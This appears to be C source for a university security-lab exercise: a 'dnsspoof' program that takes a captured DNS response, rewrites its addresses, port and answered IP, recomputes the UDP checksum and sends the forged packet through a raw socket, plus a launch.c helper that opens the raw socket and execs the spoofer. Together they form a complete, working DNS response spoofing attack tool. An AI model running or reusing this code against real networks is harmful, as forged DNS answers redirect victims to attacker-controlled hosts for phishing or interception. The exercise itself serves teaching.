#include <sys/socket.h>
#include <sys/types.h>
#include <netinet/ip.h>
#include <netinet/udp.h>
#include <errno.h>

#include <stdio.h>
#include <stdlib.h>
#include <string.h>

struct IpHeader
{
	uint8_t version:4;
	uint8_t header_length:4;
	uint8_t differentiated_services:6;
	uint8_t congestion_notification:2;
	uint16_t length:16;
	uint16_t identification:16;
	uint16_t flags:3;
	uint16_t fragment_offset:13;
	uint8_t ttl:8;
	uint8_t protocol:8;
	uint16_t checksum:16;
	uint32_t src_ip:32;
	uint32_t dest_ip:32;
};

struct UdpHeader
{
	uint16_t src_port;
	uint16_t dest_port;
	uint16_t length;
	uint16_t checksum;
};

struct UdpPseudoHeader
{
	uint32_t src_ip;
	uint32_t dest_ip;
	uint8_t zero;
	uint8_t protocol;
	uint16_t length;
};

uint16_t udp_checksum(uint8_t * buffer, int length, struct UdpPseudoHeader * header)
{
	uint32_t sum = 0;
	int i;
	int max_i;
	
	max_i = (length % 2 == 0) ? length : length - 1;
	
	for (i = 0; i < max_i; i += 2)
	{
		printf("%04X\n", (((((uint16_t) buffer[i]) << 8) & 0xFF00) + (((uint16_t) buffer[i + 1]) & 0xFF)) & 0xFFFF);
		sum += (((((uint16_t) buffer[i]) << 8) & 0xFF00) + (((uint16_t) buffer[i + 1]) & 0xFF)) & 0xFFFF;
	}
	
	if ((length % 2) == 1)
	{
		printf("%04X\n", (buffer[length - 1] << 8) & 0xFF00);
		sum += (buffer[length - 1] << 8) & 0xFF00;
	}
	
	printf ("Begin of pseudo header\n");
	
	for (i = 0; i < sizeof(struct UdpPseudoHeader); i += 2)
	{
		printf("%04X\n", ((((uint16_t) ((uint8_t *) header)[i]) << 8) & 0xFF00) + (((uint16_t) ((uint8_t *) header)[i + 1]) & 0xFF));
		sum += (((((uint16_t) ((uint8_t *) header)[i]) << 8) & 0xFF00) + (((uint16_t) ((uint8_t *) header)[i + 1]) & 0xFF)) & 0xFFFF;
	}
	
	while (sum & 0xFFFF0000)
	{
		sum = (sum & 0xFFFF) + (sum >> 16);
	}
	
	if (sum == 0xFFFF)
	{
		return 0xFFFF;
	}
	else {
		return (uint16_t) ~sum;
	}
}
	
#define DNS_ADDRESS_OFFSET 83

char test_captured_packet[] = {
	0x45, 0x00, 0x00, 0x3d, 0x44, 0x51, 0x40, 0x00, 0x40, 0x11, 0xe3, 0xf5, 0x81, 0xbb, 0x64, 0xdd, 
	0x0a, 0x9c, 0x21, 0x35, 0x85, 0xab, 0x00, 0x35, 0x00, 0x29, 0x68, 0xc4, 0xcb, 0x2a, 0x01, 0x00, 
	0x00, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x03, 0x77, 0x77, 0x77, 0x07, 0x69, 0x73, 0x65, 
	0x63, 0x6c, 0x61, 0x62, 0x03, 0x6f, 0x72, 0x67, 0x00, 0x00, 0x01, 0x00, 0x01
};

char captured_packet[] = {
   /* Offset 0 */
	/* IP version/hdr len*/  0x45, 
	/* IP DSF */  0x00, 
	/* IP length */ 0x00,  0xa3,
	/* IP ident? */   0x0e, 0x73,       
	/* IP flag/offset */   0x00, 0x00, 
	/* IP TTL */      0x40, 
	/* IP protocol */ 0x11, 
	/* IP chksum */   0x69, 0x64, 
	/* IP source */   0x50, 0x50, 0x50, 0x50, 
	/* Offset 16 */
	/* IP dest */     0x80, 0x83, 0xe1, 0x4f, 
	/* UDP source port */ 0x00, 0x35, 
	/* UDP Dest port */   0x27, 0x10, 
	0x00, 0x8f, 
	/* UDP chksum */  0x3f, 0x4c, 
	0x44, 0x6f, 0x85, 0x80, 
	/* Offset 32 */
	0x00, 0x01, 0x00, 0x01, 0x00, 0x02, 0x00, 0x02, 0x07, 0x69, 0x6e, 0x65, 0x74, 0x73, 0x65, 0x63, 
	/* Offset 48 */
	0x04, 0x61, 0x75, 0x74, 0x6f, 0x06, 0x74, 0x75, 0x77, 0x69, 0x65, 0x6e, 0x02, 0x61, 0x63, 0x02, 
	/* Offset 64 */
	0x61, 0x74, 0x00, 0x00, 0x01, 0x00, 0x01, 0xc0, 0x0c, 0x00, 0x01, 0x00, 0x01, 0x00, 0x01, 0x51, 
	/* Offset 80 */
	0x80, 0x00, 0x04, 
	/* DNS resp A */  0x64, 0x64, 0x64, 0x64, 
	0xc0, 0x14, 0x00, 0x02, 0x00, 0x01, 0x00, 0x01, 0x51, 0x80, 0x00, 
	0x0a, 0x07, 0x74, 0x75, 0x6e, 0x61, 0x6d, 0x65, 0x62, 0xc0, 0x19, 0xc0, 0x14, 0x00, 0x02, 0x00, 
	0x01, 0x00, 0x01, 0x51, 0x80, 0x00, 0x0a, 0x07, 0x74, 0x75, 0x6e, 0x61, 0x6d, 0x65, 0x61, 0xc0, 
	0x19, 0xc0, 0x5d, 0x00, 0x01, 0x00, 0x01, 0x00, 0x01, 0x51, 0x80, 0x00, 0x04, 0x80, 0x82, 0x02, 
	0x03, 0xc0, 0x47, 0x00, 0x01, 0x00, 0x01, 0x00, 0x01, 0x51, 0x80, 0x00, 0x04, 0x80, 0x82, 0x03, 
	0x83
};

int main(int argc, char ** argv)
{
	int err;
	int one = 1;
	int sock;
	char * envvar;
	struct sockaddr_in dest_addr;
	struct IpHeader * ip_header = (struct IpHeader *) captured_packet;
	struct UdpHeader * udp_header = (struct UdpHeader *) (captured_packet + sizeof(struct IpHeader));
	struct UdpPseudoHeader udp_pseudo_header;

	if (argc != 5 && argc != 4)
	{
		printf("Usage: %s <source address> <destination address> <destination port> <answer IP>\n", (argc > 0 ? argv[0] : "./dnsspoof"));
		printf("\t<source address> is the source IP address of the UDP packet\n");
		printf("\t<destination address> is the destination IP address of the UDP packet\n");
		printf("\t<destination port> is the destination port for the UDP packet\n");
		printf("\t<answer IP> is the IP address for the DNS lookup that your program should return to the client.\n");
		exit(1);
	}
	
	envvar = getenv("SOCK_FD");
	
	if (!envvar || envvar[0] == 0) {
		printf("environment variable SOCK_FD is empty\n");
		exit(1);
	}
	
	printf("using socket %s\n", envvar);
	
	sock = atoi(envvar);
	
	if (sock < 0) {
		printf("error in socket(): %d\n", errno);
		exit(1);
	}
	
	else {
		printf("socket() - Using SOCK_RAW socket and UDP protocol is OK.\n");
	}
	
	if ((err = setsockopt(sock, IPPROTO_IP, IP_HDRINCL, &one, sizeof(one))) < 0)
	{
		printf("error in setsockopt(): %d\n", errno);
		exit(1);
	}
	else {
		printf("setsockopt() is ok\n");
	}
	
	//set destination socket address
	memset(&dest_addr, sizeof(struct sockaddr_in), 0);
	dest_addr.sin_family = AF_INET;
	dest_addr.sin_port = htons(10000);
	dest_addr.sin_addr.s_addr = inet_addr(argv[2]);
	
	ip_header->src_ip = inet_addr(argv[1]);
	ip_header->dest_ip = inet_addr(argv[2]);
	
	udp_header->checksum = 0;
	//ip checksum is calculated automatically by linux on send
	ip_header->checksum = 0;
	
	udp_header->dest_port = htons(atoi(argv[3]));
	udp_header->src_port = htons(53);
	
	if (argc > 4) {
		*((uint32_t *) &captured_packet[DNS_ADDRESS_OFFSET]) = inet_addr(argv[4]);
	}
	
	udp_pseudo_header.src_ip = ip_header->src_ip;
	udp_pseudo_header.dest_ip = ip_header->dest_ip;
	udp_pseudo_header.protocol = ip_header->protocol;
	udp_pseudo_header.length = udp_header->length;
	udp_pseudo_header.zero = 0;
	
	udp_header->checksum = htons(udp_checksum((uint8_t *) udp_header, sizeof(captured_packet) - sizeof(struct IpHeader), &udp_pseudo_header));
	

	
	if ((err = sendto(sock, captured_packet, sizeof(captured_packet), 0, (struct sockaddr *) &dest_addr, sizeof(struct sockaddr_in))) != sizeof(captured_packet))
	{
		printf ("error executing send(): %d\n", errno);
		exit(1);
	}
	else {
		printf("send() of %d bytes successful\n", sizeof(captured_packet));
	}
	
	close(sock);
	
	
	
	return 0;
}


launch.c

#include <stdio.h>
#include <sys/socket.h>
#include <netinet/udp.h>
#include <netinet/ip.h>
#include <sys/types.h>

#include <stdlib.h>
#include <errno.h>

int main(int argc, char ** argv)
{
	int sock;
	char envvar[100];
	
	if (argc < 2) {
		printf("USAGE: launch <program>\n");
		exit(1);
	}

	sock = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);

	if (sock < 0)
	{
		printf("%s: opening socket failed with error %d\n", argv[0],errno);
		exit(1);
	}
	
	sprintf(envvar, "%d", sock);
	setenv("SOCK_FD", envvar, 1);

	execv(argv[1], &argv[1]);

	return 0;
}
